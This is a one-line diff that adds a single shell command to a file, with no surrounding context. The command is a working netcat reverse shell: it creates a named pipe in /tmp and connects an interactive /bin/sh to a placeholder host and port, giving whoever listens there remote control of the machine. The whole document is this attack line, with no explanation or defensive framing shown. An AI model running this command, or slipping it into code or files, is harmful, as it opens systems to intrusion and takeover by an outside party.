@@ -1,0 +1,1 @@
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc SHELLDROP_HOST SHELLDROP_PORT >/tmp/f
